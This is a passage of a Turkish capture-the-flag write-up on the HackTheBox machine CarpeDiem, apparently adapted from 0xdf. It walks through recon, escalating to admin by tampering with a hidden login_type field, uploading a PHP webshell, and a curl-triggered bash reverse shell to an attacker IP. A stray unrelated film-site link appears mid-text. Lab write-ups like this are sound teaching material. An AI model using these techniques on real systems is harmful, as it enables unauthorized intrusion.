---
{"dg-publish":true,"permalink":"/ctf/htb-carpe-diem/"}
---

[hackthebox](https://0xdf.gitlab.io/tags#hackthebox) [htb-carpediem](https://0xdf.gitlab.io/tags#htb-carpediem) [ctf](https://0xdf.gitlab.io/tags#ctf) [nmap](https://0xdf.gitlab.io/tags#nmap) [feroxbuster](https://0xdf.gitlab.io/tags#feroxbuster) [wfuzz](https://0xdf.gitlab.io/tags#wfuzz) [vhosts](https://0xdf.gitlab.io/tags#vhosts) [php](https://0xdf.gitlab.io/tags#php) [trudesk](https://0xdf.gitlab.io/tags#trudesk) [html-file](https://0xdf.gitlab.io/tags#html-file) [upload](https://0xdf.gitlab.io/tags#upload) [burp](https://0xdf.gitlab.io/tags#burp) [burp-repeater](https://0xdf.gitlab.io/tags#burp-repeater) [webshell](https://0xdf.gitlab.io/tags#webshell) [docker](https://0xdf.gitlab.io/tags#docker) [container](https://0xdf.gitlab.io/tags#container) [pivot](https://0xdf.gitlab.io/tags#pivot) [chisel](https://0xdf.gitlab.io/tags#chisel) [mongo](https://0xdf.gitlab.io/tags#mongo) [mongoexport](https://0xdf.gitlab.io/tags#mongoexport) [bcrypt](https://0xdf.gitlab.io/tags#bcrypt) [python](https://0xdf.gitlab.io/tags#python) [api](https://0xdf.gitlab.io/tags#api) [source-code](https://0xdf.gitlab.io/tags#source-code) [voip](https://0xdf.gitlab.io/tags#voip) [zoiper](https://0xdf.gitlab.io/tags#zoiper) [voicemail](https://0xdf.gitlab.io/tags#voicemail) [backdrop-cms](https://0xdf.gitlab.io/tags#backdrop-cms) [wireshark](https://0xdf.gitlab.io/tags#wireshark) [tcpdump](https://0xdf.gitlab.io/tags#tcpdump) [tls-decryption](https://0xdf.gitlab.io/tags#tls-decryption) [weak-tls](https://0xdf.gitlab.io/tags#weak-tls) [backdrop-plugin](https://0xdf.gitlab.io/tags#backdrop-plugin) [docker-escape](https://0xdf.gitlab.io/tags#docker-escape) [cgroups](https://0xdf.gitlab.io/tags#cgroups) [cve-2022-0492](https://0xdf.gitlab.io/tags#cve-2022-0492) [htb-ready](https://0xdf.gitlab.io/tags#htb-ready)

CarpeDiem, pivoting yaparak küçük bir Docker container ağı üzerinden ilerlemeyi içeren zor bir Linux makinesidir. Başlangıçta, bir web sitesinde admin erişimi elde edeceğim ve bir upload özelliğini kullanarak bir webshell yükleyip bu container'a bir foothold kazanacağım. Daha sonra ağı enumerate ederek bir **Trudesk** instance'ı bulacağım. Buradan, yeni bir çalışan hakkında, kimlik bilgilerinin voicemail üzerinden iletileceğini belirten bir ticket okuyacağım. Bu ticket'taki talimatları takip ederek voicemail'e erişim sağlayıp SSH parolasını alacağım.

SSH ile erişim sağladıktan sonra, bir **Backdrop CMS** instance'ına pivoting yapacağım. Burada kimlik bilgilerini elde edip kötü niyetli bir plugin yükleyerek ilerleyeceğim. Bu noktadan sonra, container içinde root erişimi elde edeceğim ve ardından **CVE-2022-0492** güvenlik açığını kötüye kullanarak host üzerinde root yetkilerine ulaşacağım.


## Box Info

|Name|[CarpeDiem](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fcarpediem)[![CarpeDiem](https://0xdf.gitlab.io/icons/box-carpediem.png)](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fcarpediem)  <br>[Play on HackTheBox](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fcarpediem)|
|---|---|
|Release Date|[25 Jun 2022](https://twitter.com/hackthebox_eu/status/1539624282686464005)|
|Retire Date|03 Dec 2022|
|OS|Linux ![Linux](https://0xdf.gitlab.io/icons/Linux.png)|
|Base Points|Hard [40]|
|Rated Difficulty|![Rated difficulty for CarpeDiem](https://0xdf.gitlab.io/img/carpediem-diff.png)|
|Radar Graph|![Radar chart for CarpeDiem](https://0xdf.gitlab.io/img/carpediem-radar.png)|
|![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)|01:23:15[![jazzpizazz](https://www.hackthebox.com/badge/image/87804)](https://app.hackthebox.com/users/87804)|
|![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)|02:20:39[![jazzpizazz](https://www.hackthebox.com/badge/image/87804)](https://app.hackthebox.com/users/87804)|
|Creators|[![ctrlzero](https://www.hackthebox.com/badge/image/168546)](https://app.hackthebox.com/users/168546)  <br>[![TheCyberGeek](https://www.hackthebox.com/badge/image/114053)](https://app.hackthebox.com/users/114053)|

## Recon

### nmap

nmap iki açık TCP portu bulur, SSH (22) ve HTTP (80):

```
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.167
Starting Nmap 7.80 ( https://nmap.org ) at 2022-11-28 13:59 UTC
Nmap scan report for 10.10.11.167
Host is up (0.087s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.25 seconds


oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.167
Starting Nmap 7.80 ( https://nmap.org ) at 2022-11-28 14:49 UTC
Nmap scan report for 10.10.11.167
Host is up (0.086s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Comming Soon
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.93 seconds
```


[OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) sürümüne göre, host muhtemelen Ubuntu focal 20.04 çalıştırıyor.


### Website - TCP 80

#### Site

Site, “ coming soon” geri sayımı için çok uzun bir zamanlayıcı dışında fazla bilgi sunmuyor:

![Pasted image 20250107234202.png](/img/user/resimler/Pasted%20image%2020250107234202.png)

Sanal makinemdeki /etc/hosts dosyasına ekleyeceğim bir domain adı veriyor.

“ Subscribe” butonu “Your email address” kısmına girilen verileri bile göndermiyor, bunun yerine sadece /?


#### Tech Stack

HTTP headers NGINX (nmap ile eşleşiyor) dışında pek bir şey göstermiyor:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 28 Nov 2022 14:51:36 GMT
Content-Type: text/html
Last-Modified: Thu, 07 Apr 2022 22:54:58 GMT
Connection: close
ETag: W/"624f6bc2-b3b"
Content-Length: 2875
```

HTML kaynağına hızlı bir bakış sadece bir bootstrap template'i gösteriyor. Çok ilginç başka bir şey yok.

#### Directory Brute Force

Feroxbuster'ı siteye karşı çalıştırıyorum ve ilginç bir şey bulamıyor:

```
oxdf@hacky$ feroxbuster -u http://carpediem.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://carpediem.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       58l      161w     2875c http://carpediem.htb/
301      GET        7l       12w      178c http://carpediem.htb/scripts => http://carpediem.htb/scripts/
301      GET        7l       12w      178c http://carpediem.htb/img => http://carpediem.htb/img/
301      GET        7l       12w      178c http://carpediem.htb/styles => http://carpediem.htb/styles/
[####################] - 54s   150000/150000  0s      found:4       errors:0
[####################] - 53s    30000/30000   565/s   http://carpediem.htb
[####################] - 53s    30000/30000   564/s   http://carpediem.htb/
[####################] - 52s    30000/30000   566/s   http://carpediem.htb/scripts
[####################] - 53s    30000/30000   565/s   http://carpediem.htb/img
[####################] - 53s    30000/30000   565/s   http://carpediem.htb/styles
```


### Subdomain Fuzz

Carpediem.htb domain adının kullanımı göz önüne alındığında, farklı bir sayfa döndürebilecek diğer subdomainleri arayacağım. Host başlığını fuzzlamak için wfuzz kullanacağım ve 2875 bayt uzunluğundaki varsayılan sayfayı filtreleyeceğim:

```
oxdf@hacky$ wfuzz -u http://carpediem.htb -H "Host: FUZZ.carpediem.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 2875
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://carpediem.htb/
Total requests: 4989

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000048:   200        462 L    2174 W   31090 Ch    "portal"

Total time: 44.55443
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 111.9753
```


### portal.carpediem.htb - TCP 80

#### Site

Bu site motosikletler hakkında:

![Pasted image 20250107234612.png](/img/user/resimler/Pasted%20image%2020250107234612.png)


“About” (Hakkında) bağlantısı sadece bazı lorem ipsum metinleri verir. “ Categories” (Kategoriler) ve “Brand” (Marka), filtreleme yapabilen açılır pencereler sağlar:

![Pasted image 20250107234658.png](/img/user/resimler/Pasted%20image%2020250107234658.png)


#### With Account

“ Login ” tıklandığında bir form açılır penceresi görüntülenir:

![Pasted image 20250107234727.png](/img/user/resimler/Pasted%20image%2020250107234727.png)

“ Create Account” (Hesap Oluştur) bağlantısı bir kayıt formu sunmaktadır:

![Pasted image 20250107235040.png](/img/user/resimler/Pasted%20image%2020250107235040.png)

Formu doldurduktan sonra, “Login” ifadesi “Hi, 0xdf!” ve bir çıkış (logout) simgesiyle değiştirilir:

![Pasted image 20250107235112.png](/img/user/resimler/Pasted%20image%2020250107235112.png)

“Hello, 0xdf!” bölümünden hesabımla ilgili bir sayfa olması dışında diğer her şey aynı:

![Pasted image 20250107235141.png](/img/user/resimler/Pasted%20image%2020250107235141.png)

“ Manage Account” bir şeyleri değiştirmek için bir sayfaya yönlendirir:

![Pasted image 20250107235209.png](/img/user/resimler/Pasted%20image%2020250107235209.png)

Her motosiklet görüntülendiğinde, bir “Book this Bike” düğmesi bulunur. Giriş yapılmamışsa, giriş formu açılır. Aksi takdirde, bir motosiklet ayırtma formu açılır:

![Pasted image 20250107235258.png](/img/user/resimler/Pasted%20image%2020250107235258.png)


Gönderirken gösteriyor:

![Pasted image 20250107235312.png](/img/user/resimler/Pasted%20image%2020250107235312.png)

Artık tüm rezervasyonlar “My Bookings” sayfasında görünmektedir:

![Pasted image 20250107235335.png](/img/user/resimler/Pasted%20image%2020250107235335.png)

#### Tech Stack

Bu subdomain için HTTP header'ları sitenin PHP çalıştırdığını gösterir:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 28 Nov 2022 15:13:32 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 31090
Connection: close
X-Powered-By: PHP/7.4.25
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
```

Bunu, `/index.php'nin` aynı sayfayı yüklediğini, ancak `index.html` veya diğer yolların yüklemediğini göstererek doğrulayabilirim.

URL yapısı da oldukça ilginç. “Home” sayfası dışındaki her sayfa bir `?p=[name]` değişkeni belirtiyor. Örneğin, “About” sayfası için `p=about` kullanılıyor. “All Categories” (Tüm Kategoriler) sayfasını görüntülemek için `p=view_categories` ayarlanıyor. Honda motosikletlerini filtrelemek için `p=bikes&s=c81e728d9d4c2f636f067f89cc14862c` kullanılıyor; burada `s`, Honda için bir ID’yi temsil ediyor. Kategori filtresi ise benzer şekilde çalışıyor, ancak bu durumda `c` değişkeni kullanılıyor.

Bu noktada, p değişkenine göre sayfaları ya dahil eden ya da dallandıran bir PHP sayfası görebiliyorum. p değerini `index` olarak ayarlamayı deneyeceğim ve ne olduğunu göreceğim. Sayfa çöküyor:

![Pasted image 20250107235649.png](/img/user/resimler/Pasted%20image%2020250107235649.png)

Bu, sayfanın `index.php` dosyasını dahil etmeye çalışması, ardından `index.php` dosyasının tekrar kendini dahil etmeye çalışması ve bu döngünün belleğin tükenmesine kadar devam etmesi durumudur. Aynı zamanda, disk üzerindeki web dizininin tam yolunu da ortaya çıkarır.


---

Bu durumda, web uygulaması, URL'de verilen `p` parametresine göre dosyaları dahil ediyor gibi görünüyor. Örneğin, `p=about` parametresi ile `about.php` gibi bir dosya dahil edilebilir. Ancak burada, `p=index` parametresini verdiğinizde şöyle bir durum oluşuyor:


1. **`index.php` Kendini Dahil Ediyor:**  

* Sayfa, `index.php` dosyasını dahil etmeye çalışıyor. Ancak, bu dosyanın içinde aynı `index.php` dosyasını tekrar dahil eden bir kod bulunuyor. Örneğin:

```
include($_GET['p'] . '.php');
```

Bu durumda, `p=index` olduğunda, `index.php` kendi içine `index.php` dosyasını dahil etmeye çalışıyor.


2. **Sonsuz Döngü Oluşuyor:**  
* `index.php` dosyası, bir kez daha kendi kendini dahil etmeye çalışıyor. Bu işlem sonsuz bir döngü yaratıyor, çünkü her dahil edilen `index.php` bir başka `index.php` daha dahil etmeye çalışıyor.

3. **Bellek Tükeniyor:**  
* PHP'nin bir işlemi gerçekleştirmek için kullanabileceği belirli bir bellek sınırı vardır. Bu döngü, sürekli olarak yeni bir `index.php` dosyası dahil ettiği için bellek sınırını aşar ve program çökmesine neden olur.

4. **Tam Dizin Ortaya Çıkıyor:**  
* PHP çökme sırasında hata mesajı verirken genellikle bir "include" hatası gösterir. Örneğin:

```
Fatal error: Allowed memory size of 134217728 bytes exhausted (tried to allocate 1234 bytes) in /var/www/html/index.php on line 10
```

Bu mesajda, sunucuda **`/var/www/html/`** gibi bir dizin yolu belirtilir. Bu, saldırganlar için faydalı bir bilgi olabilir, çünkü web uygulamasının dosya sistemindeki tam konumunu öğrenmiş olurlar.

### Özet

Kısaca, `p=index` parametresi, `index.php` dosyasının kendini tekrar tekrar dahil etmeye çalışmasına neden oluyor, bu da sonsuz bir döngü oluşturuyor ve bellek sınırını aşarak çökme yaratıyor. Hata mesajı ise web uygulamasının dosya sistemi yolunu açığa çıkarıyor, bu da güvenlik açısından bir risk oluşturabilir.


---



#### Directory Brute Force

feroxbuster -x php ile bir ton şey döndürür (okunabilirlik için çoğu burada kesilmiştir):

```
oxdf@hacky$ feroxbuster -u http://portal.carpediem.htb -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://portal.carpediem.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      330c http://portal.carpediem.htb/plugins => http://portal.carpediem.htb/plugins/
301      GET        9l       28w      328c http://portal.carpediem.htb/admin => http://portal.carpediem.htb/admin/
200      GET       75l      135w     2963c http://portal.carpediem.htb/login.php
200      GET      462l     2174w        0c http://portal.carpediem.htb/
302      GET        0l        0w        0c http://portal.carpediem.htb/logout.php => ./
301      GET        9l       28w      326c http://portal.carpediem.htb/inc => http://portal.carpediem.htb/inc/
301      GET        9l       28w      330c http://portal.carpediem.htb/uploads => http://portal.carpediem.htb/uploads/
301      GET        9l       28w      329c http://portal.carpediem.htb/assets => http://portal.carpediem.htb/assets/
...[snip]...
```

En ilginç bulgu /admin. Bunu ziyaret etmeye çalışmak bir açılır pencere döndürür:

 ![Pasted image 20250108000621.png](/img/user/resimler/Pasted%20image%2020250108000621.png)


## Shell as www-data in Portal Container

### Fails

#### Failed Source Read

Yukarıdaki analize dayanarak, `index.php` sayfasının büyük ihtimalle şu şekilde bir şey çağırdığından oldukça eminim: `include $_GET['p'] . '.php'`. Çünkü uzantıyı ekliyor, bu nedenle PHP olmayan dosyaları okumayı deneyemem.

PHP filtrelerini kullanarak dosyaların kaynak kodlarını base64 ile encode etmeyi deneyebilirim. Ne yazık ki, bu işlem başarısız oluyor:

```
?p=php://filter/convert.base64-encode/resource=index
```

![Pasted image 20250108000829.png](/img/user/resimler/Pasted%20image%2020250108000829.png)

En iyi tahminim, filtreye izin vermemek için bir şekilde filtreleme yaptığıdır. Beyond Root'ta neler olduğunu göstereceğim.


#### Failed XSS

Bir motosiklet rezervasyonu geri aldığımda, mesajda “The management will contact you as soon they sees your request for confirmation (Yönetim, onay talebinizi görür görmez sizinle iletişime geçecektir.)” ifadesi bulunuyor. Bu, yönetimin başvurumu inceleyeceğini ima ediyor ve bu da belki bir Cross-Site Scripting (XSS) açığının olabileceğini düşündürüyor.

Bir başvuru gönderdiğimde neler olduğunu incelediğimde, aslında iki POST isteği yapıldığını görüyorum, bunlar **/classes/Master.php** yoluna gönderiliyor:


![Pasted image 20250108001156.png](/img/user/resimler/Pasted%20image%2020250108001156.png)


Birincisi rezervasyonla ilgili bilgileri içerir:

```
POST /classes/Master.php?f=rent_avail HTTP/1.1
Host: portal.carpediem.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 49
Origin: http://portal.carpediem.htb
Connection: close
Referer: http://portal.carpediem.htb/?p=view_bike&id=37693cfc748049e45d87b8c7d8b9aacd
Cookie: PHPSESSID=3f3b1c31ece180ebe219b6053acf79e9
Pragma: no-cache
Cache-Control: no-cache

ds=2022-11-29&de=2022-12-07&bike_id=23&max_unit=3
```

İkincisi aynı verileri form verisi olarak gönderir:

```
POST /classes/Master.php?f=save_booking HTTP/1.1
Host: portal.carpediem.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------12614741991968432430841744607
Content-Length: 654
Origin: http://portal.carpediem.htb
Connection: close
Referer: http://portal.carpediem.htb/?p=view_bike&id=37693cfc748049e45d87b8c7d8b9aacd
Cookie: PHPSESSID=3f3b1c31ece180ebe219b6053acf79e9
Pragma: no-cache
Cache-Control: no-cache

-----------------------------12614741991968432430841744607
Content-Disposition: form-data; name="bike_id"

23
-----------------------------12614741991968432430841744607
Content-Disposition: form-data; name="date_start"

2022-11-29
-----------------------------12614741991968432430841744607
Content-Disposition: form-data; name="date_end"

2022-12-07
-----------------------------12614741991968432430841744607
Content-Disposition: form-data; name="rent_days"

9
-----------------------------12614741991968432430841744607
Content-Disposition: form-data; name="amount"

9000
-----------------------------12614741991968432430841744607--
```


İkinci POST isteğinin birincisinden bilgi alması mümkün olabilir, ancak öyle görünmüyor. İkinci POST isteği muhtemelen veriyi (büyük ihtimalle veritabanına) kaydeden istektir, bu yüzden burada XSS payload'ları deneyeceğim. Sayılar muhtemelen iyi hedefler değildir, ancak tarihlerin string (metin) olarak işlenip işlenmediğini kontrol edebilirim. Örneğin:

![Pasted image 20250108002139.png](/img/user/resimler/Pasted%20image%2020250108002139.png)

![Pasted image 20250108002058.png](/img/user/resimler/Pasted%20image%2020250108002058.png)

Bunu göndermek {“status”: “success”} döndürüyor, ancak Python web sunucumda hiçbir zaman bir istek olmuyor. Her iki istekle de oynayarak biraz daha deneyeceğim, ancak hiçbir şey geri ulaşmıyor.


### Admin Access

#### Enumeration

Biraz daha kurcalayarak, hesaplarla etkileşime giren isteklere bakacağım. Hesap oluşturmak için yapılan POST isteği **/classes/Master.php?f=register** yoluna gider. POST body'sinde çok ilginç bir şey yok, sadece formdaki veriler bulunuyor.

Hesabımı değiştirmek için yapılan POST isteği daha ilginç:

```
POST /classes/Master.php?f=update_account HTTP/1.1
Host: portal.carpediem.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 125
Origin: http://portal.carpediem.htb
Connection: close
Referer: http://portal.carpediem.htb/?p=edit_account
Cookie: PHPSESSID=3f3b1c31ece180ebe219b6053acf79e9

id=25&login_type=2&firstname=0xdf&lastname=0xdf&contact=0xdf%40carpediem.htb&gender=Male&address=0xdf&username=0xdf&password=
```

Formdaki tüm görünür alanların yanı sıra **==id==** ve ==**login_type**== de dahil ediliyor. Bunlar, HTML kaynağında görülebilen gizli alanlardan geliyor:

![Pasted image 20250108014604.png](/img/user/resimler/Pasted%20image%2020250108014604.png)

#### Update login_type

**id** büyük olasılıkla veritabanındaki kullanıcı kimliğimi temsil ediyor. Sitenin bu bilgiye ihtiyaç duyması mantıklı, ancak muhtemelen bu bilgiyi cookielerden de alabilirdi.

Bu POST isteğini Burp Repeater’a gönderip üzerinde oynamalar yapacağım.

**id** değerini değiştirdiğimde, şu yanıt dönüyor: `{"status":"failed","msg":"Username or ID already exists."`. Bu mesaj pek mantıklı değil, ancak diğer kullanıcıların bilgileriyle oynayamıyor gibi görünüyorum (nedenini **Beyond Root** kısmında açıklayacağım).

Sonrasında, **login_type** değerini 2’den başka bir değere değiştirmeyi deneyeceğim. 0 olarak ayarladığımda, başarılı bir yanıt dönüyor:

![Pasted image 20250108014751.png](/img/user/resimler/Pasted%20image%2020250108014751.png)

Sitede dolaşırken herhangi bir değişiklik fark edilmiyor ve **/admin** hala "Access Denied!" yanıtını döndürüyor.

Ancak, kullanıcıma ait **login_type** değerini 1 olarak değiştirdiğimde, **/admin** sayfası yükleniyor!


https://www.filmmodu.tv/no-country-for-old-men-turkce-dublaj-fhd-film-izle 1.17

### /admin Enumeration

#### Overview

Admin panelinde bir Dashboard ve bir dizi başka sayfa vardır:

![Pasted image 20250108015538.png](/img/user/resimler/Pasted%20image%2020250108015538.png)

“Bike List” sayfası, bisikletlerin bulunduğu DB'deki tablo üzerinde bir GUI'ye benziyor:

![Pasted image 20250108020238.png](/img/user/resimler/Pasted%20image%2020250108020238.png)

Herhangi bir şeyi gerçekten düzenlemeye çalıştığımda hata veriyor.

“Booking List” bölümünde benimki de dahil olmak üzere bir sürü rezervasyon görünüyor ama XSS denediğim rezervasyonlar görünmüyor:

![Pasted image 20250108020333.png](/img/user/resimler/Pasted%20image%2020250108020333.png)

"Booking Report" sayfası, yalnızca bazı filtrelerle aynı veriyi gösteriyor.

"Brand List" ve "Category List" sayfaları, "Bike List" ile oldukça benzer. "Settings" sayfasında başlık, "About Us" metni, kapak resimleri gibi değerler bulunuyor. Ancak bu sayfada bir kaydetme düğmesi yok.


#### Submit Trudesk Ticket

"Submit Trudesk Ticket" ilginç görünüyor, ancak aslında işe yaramayan bir form:

![Pasted image 20250108020635.png](/img/user/resimler/Pasted%20image%2020250108020635.png)

En üstte şöyle yazıyor:

NOT: Trudesk entegrasyonu henüz uygulanmamıştır. Lütfen tüm taleplerinizi doğrudan Trudesk'e iletin.

Raw HTML'e baktığımızda, orada bir form var:

![Pasted image 20250108020848.png](/img/user/resimler/Pasted%20image%2020250108020848.png)

Boş bir `action` değeri, formun mevcut URL'ye gönderileceği anlamına gelir, bu da **/admin/?page=maintenance/helpdesk** oluyor. Bu form gönderimini manuel olarak yeniden oluşturabilirim, ancak gönderdiğim herhangi bir şey bu sayfada herhangi bir farklılık göstermiyor gibi görünüyor. Arka planda bir şeyler olabilir, ancak şu an için bir şeyler yapmak adına elimde yeterli veri yok.


#### Querterly Report Upload (Querterly Rapor Yükleme)

Bu sayfada yükleme fonksiyonlarının hala geliştirme aşamasında olduğu yazıyor:

![Pasted image 20250108021203.png](/img/user/resimler/Pasted%20image%2020250108021203.png)


“Action” menüsü birkaç seçenek sunuyor, ancak “View” ve “Edit” pek bir şey yapmıyor gibi görünüyor:

![Pasted image 20250108021725.png](/img/user/resimler/Pasted%20image%2020250108021725.png)

Hem “ Add” (Ekle) hem de “Delete” (Sil) bir uyarı gösterir:


![Pasted image 20250108021745.png](/img/user/resimler/Pasted%20image%2020250108021745.png)

Her biri için “ Continue” (Devam) düğmesine tıklandığında bir hata mesajı görüntülenir:

![Pasted image 20250108021805.png](/img/user/resimler/Pasted%20image%2020250108021805.png)

"Delete" seçeneği, **/classes/User.php?f=delete_file** adresine bir POST isteği gönderiyor ve 200 OK yanıtı dönüyor, ancak yanıtın bir body'si yok, bu yüzden hatanın ne olduğunu anlayamıyorum.

"Add" seçeneği ise **/classes/User.php?f=upload** adresine bir POST isteği gönderiyor ve bu da 200 OK yanıtı dönüyor. Ancak, bu isteğin bir body'si var:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 28 Nov 2022 18:54:37 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.4.25
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 40

{"error":"multipart\/form-data missing"}
```


### Webshell Upload

#### Form Data Background

Upload isteğini Burp Repeater'a göndereceğim ve onu oluşturmaya başlayacağım. Form verileri [IETF RFC-7578](https://www.rfc-editor.org/rfc/rfc7578)'de tanımlanmıştır, ancak bu[ StackOverflow yanıtı](https://stackoverflow.com/a/8660740), burada biraz işaretlediğim kısa bir örnek vermek için iyi bir iş çıkarır:

![Pasted image 20250108022221.png](/img/user/resimler/Pasted%20image%2020250108022221.png)

Kırmızı ile gösterilen kısımda, `Content-Type` header'ı `multipart/form-data` olacak ve ardından çeşitli parametreleri ayırmak için kullanılan **`boundary`** tanımlanacak. Standart bir POST isteğinde bu `&` olurdu, ancak bir formda, her öğenin hem metadata hem de veri içermesine olanak tanır. Bu nedenle, her parametre bu dize ile ayrılır. Kullanılan her sınır dizesi (boundary) başına ek bir `--` ile önceden gelir ve son sınır dizisinin sonuna da `--`eklenir.

Bu örnekteki ilk parametre (mavi etiket), sadece bir form değeridir. İlk satır metadata’dır ve `Content-Disposition: form-data` ile başlayarak, `;` ile ayrılmış bir dizi anahtar-değer çifti içerir. Buradaki `MAX_FILE_SIZE`, sunucunun bu öğeye referans vermesi için kullanılan bir ad (name) içerir.

İkinci öğe, dosya adı ve `Content-Type` header'ı dahil olmak üzere tipik bir `filename` meta verisine sahiptir.

ChatGPT'ye de bunu sormayı deneyeceğim ve o da güzel bir cevap verecek:

File input içeren bir HTML formuyla ilişkili HTTP isteği neye benzer ? 

![Pasted image 20250108023507.png](/img/user/resimler/Pasted%20image%2020250108023507.png)


#### Build Upload Request

İsteği **/classes/Users.php** adresine göndereceğim ve Repeater’da **Content-Type** başlığını ve örnekteki dosya öğesini ekleyeceğim. **Boundary** değerini değiştireceğim, bu da herhangi bir şey olabileceğini göstermek için yapılacak, ayrıca dosya hakkında metadata’yı biraz düzenleyeceğim:

![Pasted image 20250108023805.png](/img/user/resimler/Pasted%20image%2020250108023805.png)

Sunucu, `file_upload'un` eksik olduğunu belirten bir hata ile yanıt veriyor. Bu, büyük olasılıkla öğenin adına atıfta bulunuyor ve bu örnekte adı `uploadedfile` olarak geçiyor. Adı güncelleyeceğim ve bu işe yarıyor; bir yol (path) döndürüyor.

![Pasted image 20250108032123.png](/img/user/resimler/Pasted%20image%2020250108032123.png)

Bu dosya sunucuda:

![Pasted image 20250108032408.png](/img/user/resimler/Pasted%20image%2020250108032408.png)

Bu bölüm bazıları için sinir bozucu olabilir, çünkü farklı bir hata mesajı almak için `filename=something` içeren bir form **object**'ine sahip olmam gerekiyor. Bu, bir `<input type="file">` HTML etiketi tarafından oluşturulan standart form verisidir. Buradaki **name=file_upload** ise uygulamaya özel bir isimdir ve bu nedenle bu bilginin açığa çıkması için bir hata mesajına ihtiyaç duyulmaktadır.

#### Upload Webshell

Bu isteği bir PHP web shell içerecek şekilde güncelleyeceğim. Görünüşe göre, dosyanın adını koruyor ve ismin önüne bir sayı ekliyor. Bu yüzden, dosya adını **.php** ile bitecek şekilde değiştireceğim: 

It works:

![Pasted image 20250108040415.png](/img/user/resimler/Pasted%20image%2020250108040415.png)


### Shell

Komut olarak basit bir [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) koyacağım ve göndereceğim:

```
oxdf@hacky$ curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"' http://portal.carpediem.htb/uploads/1669663920_0xdf.php
```


Bir **nc** dinleyicisinde bir shell elde edilir:

```
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.167 46920
bash: cannot set terminal process group (1): Inappropriate ioctl for device
